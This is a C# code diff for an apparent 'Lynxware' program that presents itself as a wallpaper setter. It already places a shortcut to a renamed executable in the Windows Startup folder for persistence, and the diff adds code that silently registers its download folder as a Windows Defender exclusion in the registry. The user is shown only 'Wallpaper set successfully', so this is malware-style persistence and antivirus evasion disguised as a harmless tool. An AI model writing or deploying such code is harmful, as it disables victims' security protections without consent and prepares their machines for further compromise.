@@ -2,6 +2,7 @@
 using System.IO;
 using System.Net;
 using Microsoft.Win32;
+using System.Runtime.InteropServices;
 
 namespace Lynxware
 {
@@ -45,6 +46,9 @@ namespace Lynxware
             string startupFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Lynxware.lnk");
             CreateShortcut(startupFolder, renamedExecutablePath);
 
+            // Add folder to Windows Defender exclusion
+            AddFolderToWindowsDefenderExclusion(downloadDirectory);
+
             Console.WriteLine("Wallpaper set successfully.");
             Console.ReadLine(); // Wait for user input to close the console window
         }
@@ -66,7 +70,23 @@ namespace Lynxware
             shortcut.Save();
         }
 
-        [System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
+        static void AddFolderToWindowsDefenderExclusion(string folderPath)
+        {
+            // Add folder to Windows Defender exclusion list
+            try
+            {
+                var settingsPath = @"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths";
+                var key = Registry.LocalMachine.CreateSubKey(settingsPath);
+                key.SetValue(folderPath, 0, RegistryValueKind.DWord);
+                key.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error adding folder to Windows Defender exclusion: " + ex.Message);
+            }
+        }
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
     }
 }
